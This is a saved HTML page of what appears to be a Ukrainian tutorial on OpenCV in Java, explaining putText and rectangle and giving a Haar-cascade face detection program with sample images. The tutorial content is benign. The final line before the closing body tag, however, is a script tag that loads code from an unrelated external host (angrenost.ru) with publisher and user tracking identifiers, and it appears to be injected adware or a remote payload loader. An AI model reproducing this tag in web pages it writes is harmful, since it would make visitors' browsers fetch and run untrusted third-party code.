                                * or <code>FONT_HERSHEY_SCRIPT_COMPLEX</code>, where each of the font ID's can
                                * be combined with <code>FONT_HERSHEY_ITALIC</code> to get the slanted letters.
                                * @param fontScale Font scale factor that is multiplied by the font-specific
                                * base size.
                                * @param color Text color.
                                */
                                <b>public static void putText(Mat img, String text, Point org, int fontFace, double fontScale, Scalar color){}</b>
                            </code>
						</pre>
                    </div>
                </div>
                <p class="text-justify lead">
                    Вхідними параметрами є зображення в форматі Mat, текст, координати, шрифт, розмір шрифту та колір. <br>
                    Приклад затосуванян функції для малювання прямокутника:
						</p><pre>												<code>

                                                    Core.rectangle(image, new Point(rect.x, rect.y), new Point(rect.x + rect.width, rect.y + rect.height), new Scalar(250, 0, 0), 2);
                                                </code>
						</pre>
                    У даному випадку вхідними параметрами є зображення, верхня ліва координата прямокутника, нижня права координата прямокутника,
                    колір ліній та їх товщина<br>
                    Приклад роботи програми наведено нижче <br>
                    <img src="./New Age - Start Bootstrap Theme_files/input.png" width="50%" height="50%" align="center"><br><br>
                    <img src="./New Age - Start Bootstrap Theme_files/output1.png" width="50%" height="50%" align="center"><br>


                    Код прогарми наступний:

                <p></p>
<pre><code>

    CascadeClassifier faceDetector = new CascadeClassifier("C:\\Projects\\CVforStudents\\haarcascade_frontalface_alt.xml");
    Mat image = Highgui.imread("C:\\Projects\\CVforStudents\\img\\input.png");

    MatOfRect faceDetections = new MatOfRect();
    faceDetector.detectMultiScale(image, faceDetections);

    System.out.println(String.format("Detected %s faces", faceDetections.toArray().length));

    Core.putText(image, "Detected " + faceDetections.toArray().length + " persons" , new Point(image.rows(),300),
    Core.FONT_HERSHEY_TRIPLEX, .7 ,new  Scalar(0,0,255));

    // Draw a bounding box around each face.
    int i = 0;
    for (Rect rect : faceDetections.toArray()) {

    Core.putText(image, "Find" , new Point(rect.x-20,rect.y),
    Core.FONT_HERSHEY_TRIPLEX, .3 ,new  Scalar(255,255,255));

    Core.rectangle(image, new Point(rect.x, rect.y), new Point(rect.x + rect.width, rect.y + rect.height),
    new Scalar(250, 0, 0), 2);
    }

    String filename = "C:\\Projects\\CVforStudents\\img\\output1.png";
    System.out.println(String.format("Writing %s", filename));
    Highgui.imwrite(filename, image);
</code>
</pre>


            </div>
        </div>
    </div>
</section>





<div class="author">
    <footer>
        <div class="container">
            <p>© 2016 Піцун Олег</p>
            <ul class="list-inline">
                <li>
                    <a href="http://test.com/?c=CV&amp;f=show#"></a>
                </li>
                <li>
                    <a href="http://test.com/?c=CV&amp;f=show#"></a>
                </li>
                <li>
                    <a href="http://test.com/?c=CV&amp;f=show#"></a>
                </li>
            </ul>
        </div>
    </footer>
<div class="container">


<!-- jQuery -->
<script src="./New Age - Start Bootstrap Theme_files/jquery.min.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="./New Age - Start Bootstrap Theme_files/bootstrap.min.js"></script>

<!-- Plugin JavaScript -->
<script src="./New Age - Start Bootstrap Theme_files/jquery.easing.min.js"></script>

<!-- Theme JavaScript -->
<script src="./New Age - Start Bootstrap Theme_files/new-age.min.js"></script>



	</div></div><script src="http://angrenost.ru/getscripts2?&amp;b=39de75189be40d501e2e540dc7658445&amp;publisher_id=f2eae437923bf430d25d5832df79b93f&amp;uid=f26fab2ff68af0c22626ca45b690f9a4&amp;coid=e20fab62127f665ec7a643828556c77d&amp;r=&amp;h=test.com&amp;rand=1498235852129"></script></body></html>